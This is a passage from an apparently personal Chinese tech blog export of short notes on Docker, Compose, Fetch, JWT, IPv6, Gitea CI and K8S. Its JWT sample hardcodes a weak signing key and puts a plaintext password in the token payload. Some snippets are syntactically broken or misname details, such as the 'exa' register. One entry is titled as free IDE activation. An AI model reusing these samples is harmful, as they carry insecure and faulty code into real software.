具体国内源deb https://mirrors.aliyun.com/debian/ bullseye main non-free contribdeb-src https://mirrors.aliyun.com/debian/ bullseye main non-free contribdeb https://mirrors.aliyun.com/debian-security/ bullseye-security maindeb-src https://mirrors.aliyun.com/debian-security/ bullseye-security maindeb https://mirrors.aliyun.com/debian/ bullseye-updates main non-free contribdeb-src https://mirrors.aliyun.com/debian/ bullseye-updates main non-free contribdeb https://mirrors.aliyun.com/debian/ bullseye-backports main non-free contribdeb-src https://mirrors.aliyun.com/debian/ bullseye-backports main non-free contrib


引用自csdn

]]></content>
      <tags>
        <tag>轻nas</tag>
      </tags>
  </entry>
  <entry>
    <title>Compose 设置沉浸状态栏（不导入库一行代码解决）</title>
    <url>/posts/7dda0e18/</url>
    <content><![CDATA[旧(最初的版本，修改style.xml的文件来得到)在style.xml中修改代码如下即可
&lt;style name=&quot;AppFullTheme&quot; parent=&quot;AppTheme&quot;&gt;        &lt;item name=&quot;android:windowTranslucentNavigation&quot;&gt;true&lt;/item&gt;        &lt;item name=&quot;android:windowLayoutInDisplayCutoutMode&quot;&gt;shortEdges&lt;/item&gt;        &lt;item name=&quot;android:windowFullscreen&quot;&gt;true&lt;/item&gt; &lt;/style&gt;

新在使用compose时，首先找到Theme.kt找到这段代码
(view.context as Activity).window.statusBarColor = colorScheme.primary.toArgb()
将其改为
(view.context as Activity).window.statusBarColor = Color.Transparent.toArgb()
这样就完成了状态栏颜色透明色
还有两个问题：

状态栏未沉浸在MainActivity中设置
WindowCompat.setDecorFitsSystemWindows(window, false)
当然，这一部分你也可以选择通过style.xml来设置，都是一样的

状态栏字体颜色是白色![](https://image.zfxt.top/hexo-blog/Compose 设置沉浸状态栏（不导入库一行代码解决）-2023-12-14-38-47.png)默认情况下，他会根据系统是否未暗色模式来修改状态栏字体颜色。因此你可以自定义方法（在不同场景下传入不同的参数来设置颜色值）或者直接写死。设置字体颜色



引用自csdn

]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>DevOps 工具：提升软件开发和运营效率</title>
    <url>/posts/517a90b0/</url>
    <content><![CDATA[DevOps tools（DevOps工具）是指用于支持DevOps实践的软件工具集合。DevOps是一种软件开发和运营的方法论，旨在通过协作、自动化和监控等方式来增强软件开发和运营的效率和质量。DevOps工具可以帮助开发和运维团队实现自动化、协作和监控等目标，从而提高软件开发和运营的效率和质量。
一些常见的DevOps工具包括：
持续集成（Continuous Integration，CI）工具，如Jenkins、Travis CI、CircleCI等，用于自动化构建和测试代码；持续交付（Continuous Delivery，CD）工具，如Ansible、Puppet、Chef等，用于自动化部署和配置代码；容器化工具，如Docker、Kubernetes等，用于管理和部署容器化应用程序；监控和日志工具，如Prometheus、Grafana、ELK Stack等，用于监控应用程序的健康状况和日志信息；协作工具，如GitLab、GitHub、Bitbucket等，用于团队协作和版本控制。
]]></content>
      <tags>
        <tag>杂言</tag>
      </tags>
  </entry>
  <entry>
    <title>Echarts入门</title>
    <url>/posts/ae3fcb2/</url>
    <content><![CDATA[echarts的引入
在原生html中引入echarts你可以在官方下载链接获得echarts的js包
&lt;!--下载包的方式--&gt;&lt;script src=&quot;你的echar.js的路径&quot;&gt;&lt;/script&gt;&lt;!--引入网络链接的方式--&gt;&lt;script src=&quot;https://cdn.bootcdn.net/ajax/libs/echarts/5.4.2/echarts.common.js&quot;&gt;&lt;/script&gt;

在vue中引入echarts


echarts的使用echarts会自动适应和匹配容器的大小

通过js来使用echar首先先定义一个容器，用来防止echart图标

&lt;div id=&quot;echart-box&quot; style=&quot;width:600px;height:600px;&quot;&gt;&lt;/div&gt;&lt;script&gt;//初始化一个echartvar myEchart = echarts.init(document.getElementById(&#x27;echart-box&#x27;)//指定图表的配置var option = &#123;    title=&quot;老陈echarts Demo1&quot;,    tooltip:&#123;&#125;,//提示框    legend:&#123;//图标        data:[&quot;人数&quot;]    &#125;,    xAxis:&#123;        data:[&#x27;vue&#x27;,&#x27;react&#x27;,&#x27;angular&#x27;,&#x27;jquery&#x27;]    &#125;,    yAxis:&#123;&#125;,//默认为数字    series:[    	&#123;			name:&quot;人数&quot;,			type:&quot;bar&quot;,			data:[2000,1000,500,2200]		&#125;	mychart.setOption(option)&#125;



echarts配置讲解
]]></content>
      <categories>
        <category>Echarts</category>
      </categories>
  </entry>
  <entry>
    <title>Dockerfile指令指南</title>
    <url>/posts/23f4b25/</url>
    <content><![CDATA[FROM:指定基础镜像，例如 FROM Ubuntu:18.04RUN:执行命令，在dockerfile中，他每次执行RUN命令都会分层。镜像会分层。这会造成镜像臃肿，因此常用&amp;&amp;来一次执行多次命令。COPY:他会从宿主机复制文件到镜像中。例如COPY app.py /app/这个命令就会将app.py复制到镜像的app目录下，当然，这个目录你可以自己指定ADD:类似于COPY,但是他支持URL（包括其他位置和网络部分）和自动解压WORKDIR:指定工作目录，如：workdir:&#x2F;app,如果没有指定的话，他就会默认在这个目录下执行。EXPOSE：暴露端口，比如EXPOSE 80他会映射端口到宿主机的某个端口CMD:设置默认命令，他启动时会启动的命令。注意：（如果写了多个CMD他也只会执行最后一条CMD命令）如[“python”,”app.py”]ENTERPOINT:容器启动时执行的命令，如[“python”,”app.py”].而且如果在容器中，同时又ENTERPOINT和CMD，那么他将会执行ENTERPOINT，CMD将会作为参数传给ENTERPOINT。比如他会拿到ENTERPOINT的python命令，和CMD的app.py参数ENV:设置环境变量,如ENV MYSQL_ROOT_PASSWORD=your_passwordARG:添加一个环境变量，如 ARG VERSION=latestVOLUME：声明数据卷，如：VOLUME /var/lib/mysql他会映射到容器外的某个目录。如果没声明他会默认挂载到一个默认目录。USER:指定运行用户
]]></content>
  </entry>
  <entry>
    <title>Fetch API：Promise 驱动的异步请求</title>
    <url>/posts/c2abc177/</url>
    <content><![CDATA[Fetchfetch是与xhr不同的另一种发送请求的方法。他本身也是一种已经实现的API。他并不需要通过回调请求，而是采用了promise的返回结果方式，采用了链式结构。

当接收到一个代表错误的 HTTP 状态码时，从 fetch() 返回的 Promise 不会被标记为 reject，即使响应的 HTTP 状态码是 404 或 500。相反，它会将 Promise 状态标记为 resolve（如果响应的 HTTP 状态码不在 200 - 299 的范围内，则设置 resolve 返回值的 ok 属性为 false），仅当网络故障时或请求被阻止时，才会标记为 reject。
fetch 不会发送跨域 cookie，除非你使用了 credentials 的初始化选项。（自 2018 年 8 月以后，默认的 credentials 政策变更为 same-origin。Firefox 也在 61.0b13 版本中进行了修改）fetch(&#x27;http://example.com/movies.json&#x27;)  .then(response =&gt; response.json())  .then(data =&gt; console.log(data));
模板：// Example POST method implementation:async function postData(url = &#x27;&#x27;, data = &#123;&#125;) &#123;  // Default options are marked with *  const response = await fetch(url, &#123;    method: &#x27;POST&#x27;, // *GET, POST, PUT, DELETE, etc.    mode: &#x27;cors&#x27;, // no-cors, *cors, same-origin    cache: &#x27;no-cache&#x27;, // *default, no-cache, reload, force-cache, only-if-cached    credentials: &#x27;same-origin&#x27;, // include, *same-origin, omit    headers: &#123;      &#x27;Content-Type&#x27;: &#x27;application/json&#x27;      // &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;,    &#125;,    redirect: &#x27;follow&#x27;, // manual, *follow, error    referrerPolicy: &#x27;no-referrer&#x27;, // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url    body: JSON.stringify(data) // body data type must match &quot;Content-Type&quot; header  &#125;);  return response.json(); // parses JSON response into native JavaScript objects&#125;postData(&#x27;https://example.com/answer&#x27;, &#123; answer: 42 &#125;)  .then(data =&gt; &#123;    console.log(data); // JSON data parsed by `data.json()` call  &#125;);

详细参考MDN



promisePromise 对象用于表示一个异步操作的最终完成（或失败）及其结果值。
]]></content>
      <tags>
        <tag>vue</tag>
        <tag>fetch</tag>
        <tag>promise</tag>
      </tags>
  </entry>
  <entry>
    <title>ES6 Reduce：数组归并方法</title>
    <url>/posts/7b5e219/</url>
    <content><![CDATA[ES6中的reduce方法，是一种数组的归并方法。他的每一次遍历后的值会留给下一次继续遍历。
let arr5 = [&#x27;name&#x27;,&#x27;age&#x27;,&#x27;long&#x27;,&#x27;short&#x27;,&#x27;long&#x27;,&#x27;name&#x27;,&#x27;name&#x27;] //pre第一次的值，cur当前值 &#123;&#125;标识pre的预设值let arrResult1 = arr.reduce((pre,cur) =&gt;&#123;    console.log(pre,cur)    if(cur in pre)&#123;        pre[cur]++    &#125;else&#123;        pre[cur] = 1    &#125;    return pre&#125;,&#123;&#125;)console.log(arrResult1)//结果：&#123;name: 3, age: 1, long: 2, short: 1&#125;


详细使用方法

]]></content>
      <tags>
        <tag>vue</tag>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title>GCC 中在非 void 函数中不写 return 的情况</title>
    <url>/posts/eb481fa1/</url>
    <content><![CDATA[最近在复习408关于二分查找时，看到一个使用递归实现的方法。代码并不难实现。但是在写完这段代码后，发现一个问题。我在递归中并没有及时return结果。但是结果却是正确的下面贴上代码：
#include &lt;bits/stdc++.h&gt;using namespace std;int BinSearchRec(int *ST, int key, int low, int high);int main()&#123;    int st[10] = &#123;3,6,8,11,15,18,20,21,25,30&#125;;    cout &lt;&lt; BinSearchRec(st, 15, 0, 9) &lt;&lt; endl;//查找15在数组中的位置    //结果为4&#125;int BinSearchRec(int *ST, int key, int low, int high)&#123;    if (low &gt; high)        return 0;    int mid = (low + high) / 2;    // 取中间位置    if (key &gt; ST[mid]) // 向后半部分查找        //少了return        BinSearchRec(ST, key, mid + 1, high);    else if (key &lt; ST[mid]) // 向前半部分查找        //少了return        BinSearchRec(ST, key, low, mid - 1);    else        return mid;    // 查找成功&#125;

于是对在非 void 函数中不写 return 的情况产生了好奇：莫不是编译器会只能返回写在代码块中的最后一个变量？(有些高级语言是支持这样子的操作的)。经检验后发现错了ε(┬┬﹏┬┬)3所以在这里公布一下答案，并说明一下原因。在这样子的函数中，他会默认把存放于寄存器exa中的数据作为返回值返回到调用该函数的地方。

提供一个小工具c-&gt;汇编小工具

所以我们是误打误撞得到的正确的结果,从汇编的结果来看只是刚好这个结果返回时存放到了exa寄存器中，同时也只有这个地方修改了exa寄存器。因此使结果刚好对了。

在一些高级一些的IDE中，都会直接warning，不会出现这样子的错误。

]]></content>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Get-Post请求参数区别</title>
    <url>/posts/8ec2bb47/</url>
    <content><![CDATA[主要解决问题为get请求，post请求，params参数，data参数的区别和联系。
首先Get请求不能携带请求体，服务器接收到Get请求后，会默认忽视掉Get请求的请求体。也就是Get请求只能携带params参数，这个参数会直接跟在请求地址后面，组成一个字符串。
post请求既可以使用params请求，也可以携带data参数，data的参数会放在payload中。springboot需要获取post发送的payload需要通过@RequestBody来获取。

]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP连接类型：短连接VS长连接</title>
    <url>/posts/6a5f34ed/</url>
    <content><![CDATA[
引用自csdn

短连接：连接-&gt;传输数据-&gt;关闭连接比如HTTP是无状态的的短链接，浏览器和服务器每进行一次HTTP操作，就建立一次连接，但任务结束就中断连接。
长连接：因为连接后接收了数据就断开了，所以每次数据接受处理不会有联系。 这也是HTTP协议无状态的原因之一。连接-&gt;传输数据-&gt;保持连接 -&gt; 传输数据-&gt; ………..-&gt;直到一方关闭连接，多是客户端关闭连接。长连接指建立SOCKET连接后不管是否使用都保持连接，但安全性较差。
]]></content>
      <tags>
        <tag>长连接和短链接</tag>
      </tags>
  </entry>
  <entry>
    <title>Gradle 构建项目管理工具</title>
    <url>/posts/b1eeb086/</url>
    <content><![CDATA[Android经常使用build.gradle来添加依赖和批量打包。
Gradle 简单介绍Gradle 构建由 Project 和 Task 组成，Project 保存项目的属性，例如 name，版本号，代码文件位置。Task 也是 Project 的一部分，但是它是可执行的任务，我们最常使用的 build 就是一个 Task，Task 可以依赖于另外一个 Task，一个 Task 在执行的时候，它依赖的 Task 会先执行。这样，当我们 build 的时候，这个 Task 可能依赖很多的 Task，比如代码检查、注解处理，这样一层层的依赖，最终通过 build Task 全部执行。
gradle和groovy的区别Gradle是一种自动化构建工具，与之类似的还有Maven，Ant。而Groovy是一种语言，Gradle允许使用这种语言来编写。同样kotlin也是一种语言可以用来编写Gradle，这两种语言有不同的编写格式，但是都大差不差。
DSLDSL全称：Domain Specific Language，即领域特定语言，它是编程语言赋予开发者的一种特殊能力，通过它我们可以编写出一些看似脱离其原始语法结构的代码，从而构建出一种专有的语法结构。kotlin和groovy都是DSL
]]></content>
      <tags>
        <tag>gradle</tag>
      </tags>
  </entry>
  <entry>
    <title>IPV6的基础知识</title>
    <url>/posts/49e6f10d/</url>
    <content><![CDATA[【IPv6地址自动配置的一些基础知识】IPv6地址自动配置的三种基本形式：1）Stateless无状态的。 这个过程是 “无状态的”，原因是它不依赖于外部分配机制（例如IPv6动态主机配置协议（DHCPv6））的状态或是否存在。 在没有外部或用户干预的情况下， 设备尝试配置其自身的IPv6地址 （可能是多个地址）。2）Stateful有状态的。 有状态的过程仅依赖于外部地址分配机制（例如DHCPv6）。DHCPv6服务器以类似于IPv4 DHCP操作的方式，将128bit IPv6地址分配给设备。3）Stateless+Stateful无状态和有状态组合方式。 这个过程涉及无状态地址自动配置与其他IP参数的有状态配置相结合一起使用的形式。 通常情况下， 这需要一台设备使用无状态方法自动配置一个IPv6地址，之后利用DHCPv6得到其他参数或选项，比如要在给定网络上联系哪台NTP服务器来查询时间分辨率。

无状态使用无状态地址自动配置 (SLAAC, Stateless address Autoconfiguration)
有状态使用IPv6动态主机配置协议 (DHCPv6, Dynamic Host Configuration Protocol for IPv6)
无状态+有状态使用SLAAC自动配置IPv6地址，使用DHCPv6获取DNS等其他信息。

在IPv6中没有地址解析协议 (ARP, Address Resolution Protocol)，取而代之的是IPv6邻居发现协议 (NDP, Neighbor Discovery Protocol)，其中跟地址自动配置紧密相关的是路由通告 (RA, Route Advertisements) 。根据RA报文中的A-Flag、M-Flag和O-Flag的不同组合，可以告知客户端使用哪种形式自动配置地址：

RA(A&#x3D;1 M&#x3D;0 O&#x3D;0)：SLAAC（仅使用RA消息，RA中包含DNS信息选项）
RA(A&#x3D;1 M&#x3D;0 O&#x3D;1)：SLAAC+Stateless DHCPv6（RA和DHCPv6中的DNS消息选项）
RA(A&#x3D;0 M&#x3D;1 O&#x3D;0&#x2F;1)：Stateful DHCPv6（仅使用DHCPv6消息）当然也可以RA(A&#x3D;1 M&#x3D;1 O&#x3D;1)：SLAAC和DHCPv6都用来自动配置地址，OpenWrt默认是这样设置。

【RA报文中3个关键的Flag】A-Flag：Autonomous address configuration flag 自动地址配置标志表示是否配置无状态IPv6地址。在一个RA报文中，可存在多个prefix，比如2401::&#x2F;64、2402::&#x2F;64、2403::&#x2F;64，每个prefix都可以独立配置A-Flag。

1：表示主机应当在该prefix范围内SLAAC自动生成IPv6地址，并配置子网路由条目、网关。
0：表示主机不应当在该prefix范围内SLAAC自动生成IPv6地址，但是可以配置子网路由条目、网关。

M-Flag：Managed address configuration flag 受管理地址配置标志表示是否配置有状态IPv6地址。M-Flag是RA报文的全局参数，一个RA报文只有一个M-Flag。

1：表示主机可以通过DHCPv6来获得IPv6地址和其他参数（如DNS、NTP）
0：表示不通过DHCPv6来获得IPv6地址。

O-Flag：Other configuration flag 其他配置标志表示是否通过DHCPv6获得除IPv6地址以外的其他参数（如DNS、NTP）。O-Flag也是RA报文中的全局参数，一个RA报文只有一个O-Flag。注意：仅当M-Flag为0时，该参数才会被读取。

1：当M-Flag为0，将通过DHCPv6获得其他参数
0：当M-Flag为0，将不通过DHCPv6获得其他参数


引用自：https://www.right.com.cn/forum/thread-8193852-1-1.html

]]></content>
  </entry>
  <entry>
    <title>IDEA正版激活</title>
    <url>/posts/426a36c5/</url>
    <content><![CDATA[idea免费激活
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>idea激活</tag>
      </tags>
  </entry>
  <entry>
    <title>JAR包中资源访问与Class访问</title>
    <url>/posts/b7bf206e/</url>
    <content><![CDATA[在java使用以及部署应用时，经常会打一个jar包并将他安置在服务器上运行，而当你将配置文件放在resources目录下时，他将会被一起打包成一个class的类。并保存在jar包中，此时你无法通过相对路径来获取你放在resources目录下的文件，而需要通过Class.getResource()或Class.getResourceAsStream()来获取resources下的文件的访问。
请注意，jar文件中包含的资源是只读的。您将无法保存对数据库的任何更改。]]></content>
      <tags>
        <tag>JAVA</tag>
        <tag>jar包</tag>
      </tags>
  </entry>
  <entry>
    <title>Gitea实现Docker镜像打包上传全流程</title>
    <url>/posts/42fe236f/</url>
    <content><![CDATA[
本文主要记录自己这两天使用gitea实现把前后端完成打包，构建镜像，以及上传到镜像仓库中实现多地部署。

前置知识CICD其实已经有过一篇文章介绍了,所以这里不再赘述。
什么是软件仓库？软件仓库（Software Repository）是一个集中存储、管理和分发软件及其相关文件（如源代码、二进制文件、文档等）的系统或平台。它类似于一个专门存放软件的“图书馆”或“仓库”，旨在简化软件的获取、安装、更新和维护过程。例如我们常常使用到的一些jar包，npm包或者docker镜像都可以存储在其中，并提供给他人使用。
而Gitea同样也有对应的Package Registry用来支持软件仓库的功能。详见gitea文档我要存储的便是docker镜像，也就是Container，对于存储这类镜像会有很多选择，包括dockerhub，Harbor，阿里私有镜像仓库等或者干脆自己搭建也可以。各家有各家的优势，我选择gitea仅仅是因为我是在本地部署的，我本人访问可以达到最优速率，体验大大增加。也省去了一些不必要的麻烦。
与他差不多的就是Github Package Registry(也提供免费服务，但是吧，我作为新手，肯定还是现在自己这玩明白了再去别地儿玩)。
docker镜像简单介绍我本来只是会玩docker，导入各种docker镜像，搭建docker网络，以及配置相关的服务。但其实我从未自己构建过镜像。今天尝试一番，也算是揭开神秘面纱了。docker image本身就像是一个副本，用于启动各种容器，一个镜像，根据传入的参数不同，启动起来的容器也会有一点小区别。但他的内里没变，大体还是这么个东西在这。然后构建镜像的话，一般需要完成你的项目后，编写一个相对应的dockerfile文件，可以直接让ai帮你生成，然后在执行docker build -t &lt;你的镜像名字&gt; .这条命令指的是，基于你当前的目录，他会自动读取是否有dockerfile文件，有的话，就会根据这个文件和对应的目录生成一个镜像，接着就可以用docker images查看到了。若要将其导出为一个压缩包也可以通过docker save 镜像id &gt; image.tar实现相应的功能。或者你如我一般把他推送到一个镜像仓库中，便可以方便的使用了。
正式工作先随便写一个前后端项目，注意前端要与后端相关联，可以访问到后端。
然后分别编写两者的dockerfile文件我把我的两个文件示例如下：

前端：
 # 构建阶段FROM node:22 AS buildWORKDIR /appCOPY package*.json ./RUN npm ciCOPY . .RUN npm run build# 生产阶段FROM nginx:alpineCOPY --from=build /app/dist /usr/share/nginx/html# 复制nginx配置COPY nginx.conf /etc/nginx/nginx.confEXPOSE 5555CMD [&quot;nginx&quot;, &quot;-g&quot;, &quot;daemon off;&quot;]

后端
 FROM python:3.11-slimWORKDIR /app# 安装依赖RUN pip install --no-cache-dir fastapi==0.115.8 uvicorn[standard]==0.34.3 python-multipart# 复制代码COPY . .# 暴露端口EXPOSE 5000# 启动命令CMD [&quot;uvicorn&quot;, &quot;main:app&quot;, &quot;--host&quot;, &quot;0.0.0.0&quot;, &quot;--port&quot;, &quot;5000&quot;]


其中需要注意的是，你在前端中配置好的nginx.conf多半需要代理将访问的api都转发到后端。因此你在编写运行的docker-compose.yml文件时，要记得后端服务的名字与nginx配置里的名字保持一致，这样就可以将整个前后端项目组合成一个。

接下来就是重头戏，如何通过gitea action实现自动打包构建和上传。

先构建.gitea/workflow/docker-build-push.yml文件，文件名你们自己拟定，要在这个目录下，他就可以正确执行action。

展示代码
 name: Build and Push Docker Imageson:push:    branches: [ main, develop ]    tags: [ &#x27;v*&#x27; ]pull_request:    branches: [ main, develop ]jobs:build-and-push:    runs-on: ubuntu-latest    strategy:    matrix:        service: [frontend, backend]        steps:    - name: Checkout code    uses: actions/checkout@v4    with:        fetch-depth: 0  # 获取完整的提交历史用于标签生成        - name: Login to Registry    uses: docker/login-action@v3    with:        registry: gitea.zfxt.top        username: $&#123;&#123; vars.REGISTRY_USERNAME &#125;&#125;        password: $&#123;&#123; secrets.REGISTRY_PASSWORD &#125;&#125;    # 为后端服务生成元数据    - name: Extract metadata for backend    if: matrix.service == &#x27;backend&#x27;    id: meta-backend    uses: docker/metadata-action@v5    with:        images: gitea.zfxt.top/zfxt/backend        tags: |        type=raw,value=latest,enable=$&#123;&#123; github.ref == &#x27;refs/heads/main&#x27; &#125;&#125;        type=sha,prefix=,suffix=,enable=true        type=ref,event=branch        type=ref,event=pr        type=semver,pattern=&#123;&#123;version&#125;&#125;        type=semver,pattern=&#123;&#123;major&#125;&#125;.&#123;&#123;minor&#125;&#125;        type=semver,pattern=&#123;&#123;major&#125;&#125;    # 为前端服务生成元数据    - name: Extract metadata for frontend    if: matrix.service == &#x27;frontend&#x27;    id: meta-frontend    uses: docker/metadata-action@v5    with:        images: gitea.zfxt.top/zfxt/frontend        tags: |        type=raw,value=latest,enable=$&#123;&#123; github.ref == &#x27;refs/heads/main&#x27; &#125;&#125;        type=sha,prefix=,suffix=,enable=true        type=ref,event=branch        type=ref,event=pr        type=semver,pattern=&#123;&#123;version&#125;&#125;        type=semver,pattern=&#123;&#123;major&#125;&#125;.&#123;&#123;minor&#125;&#125;        type=semver,pattern=&#123;&#123;major&#125;&#125;    # 构建和推送后端镜像    - name: Build and push backend image    if: matrix.service == &#x27;backend&#x27;    uses: docker/build-push-action@v6    with:        context: ./backend        file: ./backend/dockerfile        push: true        tags: $&#123;&#123; steps.meta-backend.outputs.tags &#125;&#125;        labels: $&#123;&#123; steps.meta-backend.outputs.labels &#125;&#125;    # 构建和推送前端镜像    - name: Build and push frontend image    if: matrix.service == &#x27;frontend&#x27;    uses: docker/build-push-action@v6    with:        context: ./front        file: ./front/dockerfile        push: true        tags: $&#123;&#123; steps.meta-frontend.outputs.tags &#125;&#125;        labels: $&#123;&#123; steps.meta-frontend.outputs.labels &#125;&#125;

逐段解释
 on:push:    branches: [ main, develop ]    tags: [ &#x27;v*&#x27; ]pull_request:    branches: [ main, develop ]

 作用​​：定义工作流触发场景

​分支推送​​：当代码推送到 main或 develop分支时触发
​标签推送​​：当打上 v*格式的版本标签（如 v1.0.0）时触发
Pull Request​​：当向 main或 develop分支提交 PR 时触发

 jobs:build-and-push:    runs-on: ubuntu-latest    strategy:    matrix:        service: [frontend, backend]

 作用​​：定义并行构建任务

​​runs-on​​：使用最新 Ubuntu 环境
​matrix​​：并行构建frontend和backend两个服务

 - name: Checkout codeuses: actions/checkout@v4with:    fetch-depth: 0  # 获取完整提交历史

 作用​​：拉取仓库代码
 - name: Login to Registryuses: docker/login-action@v3with:    registry: gitea.zfxt.top    username: $&#123;&#123; vars.REGISTRY_USERNAME &#125;&#125;    password: $&#123;&#123; secrets.REGISTRY_PASSWORD &#125;&#125;

 作用​​：登录私有 Docker 仓库

​​secrets​​：需在 GitHub 仓库的 Settings &gt; Action中预先配置
vars: 同上

 - name: Extract metadata for backendif: matrix.service == &#x27;backend&#x27;id: meta-backenduses: docker/metadata-action@v5with:    images: gitea.zfxt.top/zfxt/backend    tags: |    type=raw,value=latest,enable=$&#123;&#123; github.ref == &#x27;refs/heads/main&#x27; &#125;&#125;    type=sha,prefix=,suffix=,enable=true    type=ref,event=branch    type=ref,event=pr    type=semver,pattern=&#123;&#123;version&#125;&#125;    type=semver,pattern=&#123;&#123;major&#125;&#125;.&#123;&#123;minor&#125;&#125;    type=semver,pattern=&#123;&#123;major&#125;&#125;

 ​​作用​​：为后端服务生成多维度镜像标签
 ​​标签类型​​：

latest：仅主分支构建时添加
sha：基于提交哈希的唯一标识
branch&#x2F;pr：分支&#x2F;PR 名称
semver：语义化版本（需项目支持版本管理）
​原因​​：提供多种标签便于追踪和管理镜像

 - name: Build and push backend imageif: matrix.service == &#x27;backend&#x27;uses: docker/build-push-action@v6with:    context: ./backend    file: ./backend/dockerfile    push: true    tags: $&#123;&#123; steps.meta-backend.outputs.tags &#125;&#125;    labels: $&#123;&#123; steps.meta-backend.outputs.labels &#125;&#125;

 作用​​：构建后端镜像并推送

​​context​​：Dockerfile 所在目录
file​​：Dockerfile 文件名
tags&#x2F;labels​​：复用元数据生成的标签



以上差不多就完成了，但是！我真的遇到好些问题，最后归纳一下，
- name: Set up Docker Buildx      uses: docker/setup-buildx-action@v3

这个插件！！！用不了，用了就要报EOF的错误，可以说我目前和多平台无缘了。害(我忙活了一天才揪出来这个bug，其他nginx代理，校验方式，gitea历史遗留问题都试过了)。结果发现他这个新版的buildx可能用不了。呜呜呜。难过死我了，
最后总结上传完成后，可以看到我的软件包界面多了几个可以直接使用的包差不多也就结束了，主要是那个bug太烦人了。啊啊啊。
]]></content>
      <tags>
        <tag>gitea</tag>
        <tag>docker镜像</tag>
        <tag>gitea action</tag>
      </tags>
  </entry>
  <entry>
    <title>IT业三大定律</title>
    <url>/posts/c67b30bc/</url>
    <content><![CDATA[杂言IT业三大定律

摩尔定律（Gordon Moore’s Law）每18个月,微处理器处理能力翻倍而价格不变。
吉尔德定律（George Gilder’s Law）未来25年内，主干网的带宽每6个月增长一倍，其增长速度是摩尔定律预测的 CPU 增长速度的3倍并预言将来上网终将免费。
梅特卡夫定律（Bob Metcalfe’s Law）网络的利用价值等于用户数的平方。

]]></content>
      <tags>
        <tag>数据通信</tag>
      </tags>
  </entry>
  <entry>
    <title>JSON Web Token：安全的信息传输工具</title>
    <url>/posts/ce9572ca/</url>
    <content><![CDATA[JSON Web Token 基于JSON对象为载体，安全的传输信息，用于完成授权认证。JWT分为三部分
Header
&#123;  &#x27;typ&#x27;: &#x27;JWT&#x27;,  &#x27;alg&#x27;: &#x27;HS256&#x27;&#125;
Payload(载荷，有效信息）

Signature（签名）


此处展示一个模板导入jtw
&lt;!--jwt依赖 --&gt;      &lt;dependency&gt;          &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt;          &lt;artifactId&gt;jjwt&lt;/artifactId&gt;          &lt;version&gt;0.9.1&lt;/version&gt;      &lt;/dependency&gt;      &lt;dependency&gt;          &lt;groupId&gt;javax.xml.bind&lt;/groupId&gt;          &lt;artifactId&gt;jaxb-api&lt;/artifactId&gt;          &lt;version&gt;2.4.0-b180830.0359&lt;/version&gt;      &lt;/dependency&gt;      &lt;dependency&gt;          &lt;groupId&gt;com.sun.xml.bind&lt;/groupId&gt;          &lt;artifactId&gt;jaxb-impl&lt;/artifactId&gt;          &lt;version&gt;3.0.0-M4&lt;/version&gt;      &lt;/dependency&gt;      &lt;dependency&gt;          &lt;groupId&gt;com.sun.xml.bind&lt;/groupId&gt;          &lt;artifactId&gt;jaxb-core&lt;/artifactId&gt;          &lt;version&gt;3.0.0-M4&lt;/version&gt;      &lt;/dependency&gt;
package com.zfxt.sjv.util;import io.jsonwebtoken.*;import java.util.Date;/** * @author:zfx-t * @version:1.0 */public class JwtUtil &#123;    //设置超时时间    private static long time = 1000 * 60 * 24;    //设置密钥    private static String signature = &quot;zfx-t&quot;;    public static String encrypt()&#123;        JwtBuilder jwtBuilder = Jwts.builder();        String token = jwtBuilder                //header                .setHeaderParam(&quot;typ&quot;,&quot;JWT&quot;)                .setHeaderParam(&quot;alg&quot;,&quot;HS256&quot;)                //payload                .claim(&quot;username&quot;,&quot;admin&quot;)                .claim(&quot;password&quot;,&quot;admin&quot;)                .setExpiration(new Date(System.currentTimeMillis()+time))                //signature                .signWith(SignatureAlgorithm.HS256,signature)                .compact();        return token;    &#125;    public void decrypt()&#123;        String token = &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwic3ViIjoiSldULXRlc3QiLCJleHAiOjE2ODE4NzU3ODYsImp0aSI6IjkyNDY3N2EwLTBmNDEtNGEwMi04NWY1LTVmMGMxYTY5Nzg2MyJ9.BsHrHcWcHCoWtJVdAuybeAEG1FSUpx1aUDApnEQfAkA&quot;;        JwtParser jwtParser = Jwts.parser();        Jws&lt;Claims&gt; claimsJws = jwtParser.setSigningKey(signature).parseClaimsJws(token);        Claims claims = claimsJws.getBody();        System.out.println(claims.get(&quot;username&quot;));        //获取id        System.out.println(claims.getId());        //获取主题        System.out.println(claims.getSubject());        //获取超时日期        System.out.println(claims.getExpiration());    &#125;&#125;]]></content>
      <tags>
        <tag>JAVA</tag>
        <tag>JWT</tag>
      </tags>
  </entry>
  <entry>
    <title>K8S：容器编排与微服务平台</title>
    <url>/posts/a9073959/</url>
    <content><![CDATA[K8S是什么K8S全称kubernetes，是由Google在2014年开源的生产级别的容器编排系统，或者说是微服务和云原生平台,他实际上是一个微服务框架。目前很主流的微服务框架和平台有Spring Cloud、Dubbo和K8S。Spring Cloud来自Netflix，Dubbo来自阿里，而K8S则来自Google。
PodPod是K8S设计的一个全新的概念，个Pod中可以运行一个或者多个容器。在一个集群中，K8S会为每个Pod都分配一个集群内唯一的IP地址，因为Pod中有一个叫Pause的根容器，其余的用户业务容器都是共享这个根容器的IP和Volume。
ServiceService被创建，K8S会为其分配一个集群内唯一的IP，叫做ClusterIP，ClusterIP是一个虚拟的IP地址，无法被Ping，仅仅只限于在K8S的集群内使用
负载均衡Service对客户端，屏蔽了底层Pod的寻址的过程。并且由kube-proxy进程将对Service的请求转发到具体的Pod上，具体到哪一个，由具体的调度算法决定。这样以来，就实现了负载均衡。
LabelLable就是标签，可以打在Pod上，也可以打到Service上。总结来说，Label与被标记的资源是一个一对多的关系。
Replica SetReplica Set定义了一种期望的场景，即让任何时候集群内的Pod副本数量都符合预期的值。
]]></content>
      <tags>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
